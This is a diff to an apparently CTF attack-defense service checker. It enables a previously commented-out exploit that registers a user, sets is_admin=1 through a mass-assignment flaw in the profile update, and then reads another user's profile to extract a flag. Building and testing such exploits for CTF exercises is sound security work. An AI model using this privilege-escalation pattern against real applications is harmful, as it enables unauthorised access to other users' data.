@@ -119,7 +119,7 @@ async def putflag_db(
 
     await db.set("info", (username, password, user_id))
 
-    return f"User {username} Id {user_id} Profile updated"
+    return f"User {username} Id {user_id} Profile updated" # This is attack info
 
 
 @checker.getflag(0)
@@ -146,39 +146,39 @@ async def getflag_db(
 
 
 # TODO: fix the flagRegex problem
-# @checker.exploit(0)
-# async def exploit_mass_assign(
-#     task: ExploitCheckerTaskMessage,
-#     searcher: FlagSearcher,
-#     client: AsyncClient,
-#     logger: LoggerAdapter,
-# ) -> Optional[str]:
-#     assert_equals(type(task.attack_info), str, "attack info missing")
+@checker.exploit(0)
+async def exploit_mass_assign(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+) -> Optional[str]:
+    assert_equals(type(task.attack_info), str, "attack info missing")
 
-#     assert_equals(len(task.attack_info.split()), 3)
+    assert_equals(len(task.attack_info.split()), 6)
 
-#     _, _, flaguser_id = task.attack_info.split()
+    # Attack info is in the form of "User {username} Id {user_id} Profile updated"
+    _, _, _, flaguser_id, _, _ = task.attack_info.split()
 
-#     # register user and login
-#     username, password = noise(10, 15), noise(16, 20)
-#     data = {"username": username, "password": password}
-#     r = await client.post("/index.php?action=register", data=data)
-#     assert_status_code(logger, r, 302, "Register failed", info=data)
+    # register user and login
+    username, password = noise(10, 15), noise(16, 20)
+    data = {"username": "exploiter_"+username, "password": password}
+    r = await client.post("/index.php?action=register", data=data)
+    assert_status_code(logger, r, 302, "Register failed", info=data)
 
-#     # exploit mass assignment in update profile
-#     data = {"username": username, "is_admin": 1}
-#     r = await client.post("/index.php?action=profile", data=data)
-#     assert_status_code(
-#         logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
-#     )
+    # exploit mass assignment in update profile
+    data = {"username": "exploiter_"+username, "is_admin": 1}
+    r = await client.post("/index.php?action=profile", data=data)
+    assert_status_code(
+        logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
+    )
 
-#     # get flag
-#     r = await client.get(f"/index.php?action=profile&id={flaguser_id}")
-#     assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
-#     flag = searcher.search_flag(r.text)
-#     if flag is not None:
-#         return flag
-#     raise MumbleException("flag not found")
+    # get flag
+    r = await client.get(f"/index.php?action=profile&id={flaguser_id}")
+    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
+    flag = searcher.search_flag(r.text)
+    if flag is not None:
+        return flag
 
 
 if __name__ == "__main__":
